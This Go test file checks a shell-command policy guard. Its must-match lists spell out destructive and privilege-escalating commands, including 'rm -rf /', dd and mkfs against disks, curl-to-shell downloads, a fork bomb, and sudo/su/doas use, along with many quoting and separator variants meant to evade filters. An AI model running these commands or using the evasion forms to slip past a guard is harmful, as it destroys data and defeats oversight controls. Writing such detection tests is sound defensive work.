package policy

import (
	"strings"
	"testing"
)

// commandCases holds, for every built-in command rule, commands its pattern
// must match and commands it must not match. TestCommandRuleCases fails for a
// rule that is missing here or has an empty list.
var commandCases = map[string]struct{ match, noMatch []string }{
	"sudo": {
		match: []string{"sudo id", "sudo -l", "  sudo -n true", "ls; sudo id", "ls && sudo id", "ls || sudo id", "ls | sudo tee x",
			"echo $(sudo id)", "echo `sudo id`", "/usr/bin/sudo id", "./sudo", "env X=1 nohup sudo id", "nice -n 5 sudo id",
			"timeout 5s sudo id", "sh -c 'sudo id'", `bash -lc "sudo id"`, "if true; then sudo id; fi", "(sudo id)", "{ sudo id; }",
			"FOO=bar sudo id", "xargs sudo rm < list", "sudo",
			"eval sudo id", `\sudo id`, `"sudo" id`, `'sudo' id`, "find . -exec sudo id \\;", "find . -execdir sudo id {} +",
			`sh -c 'ls; sudo id'`, `echo "$(sudo id)"`, "echo \"`sudo id`\"", "command sudo id", "command -p sudo id",
			"grep -E 'a|b' log; sudo id", `echo "it's"; sudo id`, `echo \'; sudo id`,
			// A quote in a comment, a here-doc body or an ANSI-C string never
			// hides a later line or separator.
			"echo x # '\nsudo id", "echo x # \"\nsudo id", "echo x # it's\nsudo id\necho 'done'", "echo x #' ; true\nsudo id #'",
			"cat <<'EOF'\nit's\nEOF\nsudo id", "echo $'a\\'b' ; sudo id", "echo 'a\nb' ; sudo id",
			"echo 'a' ; sudo id", `echo "x" && sudo id`, `echo \' ; sudo id`, `echo "a\"" ; sudo id`, `echo 'it'\''s' ; sudo id`,
			`echo \\ ; sudo id`, "echo 'a'\nsudo id", "bash -c \"ls; sudo id\"",
			// fish reads \' inside single quotes as an escaped quote.
			`echo 'a\'b' ; sudo id`},
		noMatch: []string{"pseudocode", "echo sudo", "grep sudo /var/log/auth.log", "cat /etc/sudoers", "visudo -c", "sudoedit /etc/x",
			"which sudo", "man sudo", "ls /usr/bin/sudo", "grep -c sudo /var/log/auth.log", "echo 'sudo id'", "id -nG sudo",
			"command -v sudo", "command -V sudo", "ps aux | grep -E 'sshd|sudo'", `grep "a;sudo" log`, "echo 'x; sudo id'",
			"find . -name sudo", "echo '$(sudo id)'", "grep -E 'sshd|sudo' /var/log/auth.log", `echo "sudo is a command"`, "ps aux | grep sudo"},
	},
	"su": {
		match:   []string{"su", "su -", "su root -c id", "ls; su -", "/bin/su -", "exec su", `\su -`, "eval su"},
		noMatch: []string{"sum file", "echo su", "id -nG su", "sudo", "subl", "ls /bin/su", "grep su /etc/group"},
	},
	"doas": {
		match:   []string{"doas id", "ls; doas -s", "/usr/bin/doas id"},
		noMatch: []string{"echo doas", "cat /etc/doas.conf", "doasx"},
	},
	"pkexec": {
		match:   []string{"pkexec id", "ls && pkexec bash", "'pkexec' sh"},
		noMatch: []string{"man pkexec", "ls /usr/bin/pkexec", "pkexecs"},
	},
	"run0": {
		match:   []string{"run0 id", "ls; run0"},
		noMatch: []string{"echo run0", "run01", "ls run0"},
	},
	"power-control": {
		match: []string{"reboot", "shutdown -h now", "poweroff", "halt -p", "ls; reboot", "/sbin/shutdown -r +5", "nohup reboot", "'reboot'"},
		noMatch: []string{"last reboot", "man shutdown", "journalctl -b -1 | grep halt", "echo poweroff", "rebooted", "shutdowns",
			"last -x | grep -E '(reboot|shutdown)'", `journalctl | grep "reboot|shutdown"`},
	},
	"init-runlevel": {
		match:   []string{"init 0", "init 6", "telinit 1", "ls; init s", "/sbin/init 6"},
		noMatch: []string{"init", "systemd-analyze", "echo init 0", "init 7", "initctl list", "init 01"},
	},
	"systemctl-power": {
		match: []string{"systemctl reboot", "systemctl poweroff", "systemctl --force reboot", "systemctl isolate rescue.target",
			"systemctl -i halt", "ls; systemctl suspend", "systemctl kexec"},
		noMatch: []string{"systemctl status sshd", "systemctl is-active nginx", "systemctl list-units", "systemctl status reboot.target",
			"echo systemctl reboot", "systemctl rebooted"},
	},
	"fs-create": {
		match:   []string{"'mkfs.ext4' /dev/sda1", "mkfs.ext4 /dev/sdb1", "mkfs -t xfs /dev/sdb", "mke2fs /dev/sdb1", "mkswap /dev/sdb2", "wipefs -a /dev/sdb", "ls; mkdosfs /dev/sdc"},
		noMatch: []string{"mkdir /tmp/x", "lsblk -f", "man mkfs", "echo mkfs", "mkfsx"},
	},
	"dd-to-device": {
		match:   []string{"dd if=/dev/zero of=/dev/sda", "dd if=x.img of=/dev/mmcblk0 bs=4M", "dd of=/dev/nvme0n1 if=/dev/zero", "ls; dd if=a of=/dev/mapper/vg-root", `dd if=a of="/dev/sda"`},
		noMatch: []string{"dd if=/dev/zero of=/dev/null bs=1M count=10", "dd if=/dev/sda of=/tmp/disk.img", "echo of=/dev/sda", "dd if=a of=b"},
	},
	"write-to-device": {
		match:   []string{"echo x > /dev/sda", "cat img >/dev/sdb", "cat img >> /dev/nvme0n1", "echo x >| /dev/vda", "cat img | tee /dev/sdb", "echo x | tee -a /dev/disk/by-id/x", "cat img >'/dev/sda'", `cat img > "/dev/sdb"`},
		noMatch: []string{"echo x > /dev/null", "ls 2>/dev/null", "echo x > /tmp/sda", "cat /dev/sda > /tmp/x", "echo x | tee /tmp/sdb", "echo '> /dev/sda'"},
	},
	"rm-root": {
		match:   []string{"rm -rf /", "rm -rf /*", "rm -fr /", "rm -r -f /", "rm --recursive /", "rm / -rf", "rm -rf /tmp/x /", "ls; rm -Rf //", "sudo rm -rf /", `rm -rf "/"`, "rm -rf '/*'", `rm "/" -rf`},
		noMatch: []string{"rm -rf /tmp/x", "rm -r ./build/", "rm -f /", "rm -rf ~/x", "echo rm -rf / is bad", "rm -rf /tmp /home", "rmdir /x", `rm -rf "/tmp"`},
	},
	"rm-no-preserve-root": {
		match:   []string{"rm -rf --no-preserve-root /", "chown -R x --no-preserve-root /"},
		noMatch: []string{"rm -rf --preserve-root /tmp", "echo no-preserve-root", "--no-preserve-rooted"},
	},
	"pipe-to-shell": {
		match: []string{"curl -s https://example.net/i.sh | sh", "curl https://example.net/i | bash", "wget -qO- https://example.net/i | sudo bash",
			"curl https://example.net/i | /bin/sh", "curl https://example.net/i | tee x | sh -", "wget -O- https://example.net/p | python3", "curl x|zsh",
			"curl x |& sh", "curl x | csh", "curl x | tcsh", "curl x | fish", "curl x | env A=1 bash", "curl x | exec sh", "curl x | 'sh'",
			"curl x \\\n| sh", "curl x | python3 -", "curl x | perl -w", "curl x | node"},
		noMatch: []string{"curl -s https://example.net | grep sh", "curl -s https://example.net/x | shasum", "curl -s https://example.net/x | jq .",
			"curl -o i.sh https://example.net/i.sh", "curl -so a.sh https://example.net/a.sh; sh -n a.sh",
			"curl -s http://127.0.0.1:8080/health | python3 -m json.tool", "curl -s x | perl -pe 's/a/b/'", "curl -s x | ruby -e 'puts 1'",
			"curl -s x | node -e 'x'", "curl -s x | php -r 'echo 1;'", "curl -s x | python3 script.py", "curl -s x | python3 -c 'import sys'"},
	},
	"download-substitution": {
		match: []string{"bash <(curl -s https://example.net/i.sh)", `sh -c "$(wget -O- https://example.net/i)"`, "eval $(curl -s https://example.net/x)",
			". <(curl -s https://example.net/x)", "source <(curl https://example.net/x)", "bash -c \"`curl https://example.net/x`\""},
		noMatch: []string{"echo $(curl -s https://example.net/ip)", "ssh x $(curl -s https://example.net/h)", "diff <(curl a) <(curl b)",
			"bash script.sh", "cat <(ls)"},
	},
	"fork-bomb": {
		match:   []string{":(){ :|:& };:", ":() { : | : & }; :", "bomb() { bomb | bomb & }; bomb"},
		noMatch: []string{"f() { echo hi; }; f", "f() { ls | wc -l; }; f", "echo ':|:&'", "a | b &", "f() { dmesg | tail && echo ok; }; f", "f() { dmesg | tail && echo ok; }"},
	},
}

func TestCommandRuleCases(t *testing.T) {
	names := map[string]bool{}
	for _, r := range builtinCommands {
		if names[r.Name] {
			t.Fatalf("sad/duplicate rule name %q", r.Name)
		}
		names[r.Name] = true
		c, ok := commandCases[r.Name]
		if !ok || len(c.match) == 0 || len(c.noMatch) == 0 {
			t.Errorf("sad/rule %q needs at least one must-match and one must-not-match case in commandCases", r.Name)
			continue
		}
		for _, s := range c.match {
			t.Run("happy/"+r.Name+"/matches "+s, func(t *testing.T) {
				if !r.re.MatchString(s) {
					t.Fatalf("rule %s does not match %q", r.Name, s)
				}
				if d := checkBuiltin(s); d.Allow {
					t.Fatalf("command %q is allowed", s)
				}
			})
		}
		for _, s := range c.noMatch {
			t.Run("sad/"+r.Name+"/does not match "+s, func(t *testing.T) {
				if r.re.MatchString(s) {
					t.Fatalf("rule %s matches %q", r.Name, s)
				}
			})
		}
	}
	for name := range commandCases {
		if !names[name] {
			t.Errorf("sad/commandCases has %q, which is not a built-in rule", name)
		}
	}
}

// checkBuiltin runs the command guard rails with no operator additions.
func checkBuiltin(cmd string) Decision {
	r := &tenantRules{maxCommandBytes: 1 << 20}
	return r.checkCommand(cmd)
}

func TestCommandGuardRails(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		max  int
		rule string // "" = allowed
	}{
		{"happy/plain read-only command", "uptime", 0, ""},
		{"happy/pipeline", "ps aux | grep sshd | head -5", 0, ""},
		{"happy/unicode text", "echo 'héllo wörld'", 0, ""},
		{"sad/empty", "", 0, RuleCommandEmpty},
		{"sad/only white space", " \t\n ", 0, RuleCommandEmpty},
		{"raging/NUL byte", "ls\x00; sudo id", 0, RuleCommandNUL},
		{"raging/invalid UTF-8", "ls \xff\xfe", 0, RuleCommandBadUTF8},
		{"edge/exactly max bytes", strings.Repeat("a", 16), 16, ""},
		{"sad/one byte over max", strings.Repeat("a", 17), 16, RuleCommandTooLong},
		{"corner/white space counts toward the length", " " + strings.Repeat("a", 16), 16, RuleCommandTooLong},
		{"corner/denied command surrounded by white space", "\t sudo id \n", 0, "sudo"},
		{"corner/first matching rule names the denial", "sudo rm -rf /", 0, "sudo"},
		{"raging/newline separates commands", "uptime\nreboot", 0, "power-control"},
		{"raging/carriage return separates commands", "uptime\rreboot", 0, "power-control"},
		// RE2's \s does not include \v, so only the TrimSpace in checkCommand
		// lets these match.
		{"corner/vertical tab before the command is trimmed", "\vsudo id", 0, "sudo"},
		{"corner/vertical tab after the target is trimmed", "rm -rf /\v", 0, "rm-root"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := &tenantRules{maxCommandBytes: 1 << 20}
			if tt.max > 0 {
				r.maxCommandBytes = tt.max
			}
			d := r.checkCommand(tt.cmd)
			if tt.rule == "" {
				if !d.Allow || d.Code != "" || d.Rule != "" {
					t.Fatalf("want allowed, got %+v", d)
				}
				return
			}
			if d.Allow || d.Code != CodePolicyDenied || d.Rule != tt.rule {
				t.Fatalf("got %+v, want policy_denied by %s", d, tt.rule)
			}
		})
	}
}

// TestCommandRuleNeeds: every built-in rule names the literals that its
// matches contain, and on every case of every rule (must-match and
// must-not-match) skipping a rule whose literals are absent agrees with
// running its expression.
func TestCommandRuleNeeds(t *testing.T) {
	for _, b := range builtinCommands {
		t.Run("happy/"+b.Name, func(t *testing.T) {
			if len(b.Needs) == 0 {
				t.Fatal("a built-in rule has no literals")
			}
			for _, c := range commandCases {
				for _, s := range append(append([]string(nil), c.match...), c.noMatch...) {
					s = strings.TrimSpace(s)
					if !b.mayMatch(s) && b.re.MatchString(s) {
						t.Fatalf("%q matches without any of %q", s, b.Needs)
					}
				}
			}
		})
	}
	t.Run("edge/an operator rule always runs", func(t *testing.T) {
		if !(commandRule{Name: "deny_commands[0]"}).mayMatch("") {
			t.Fatal("a rule without literals was skipped")
		}
	})
}
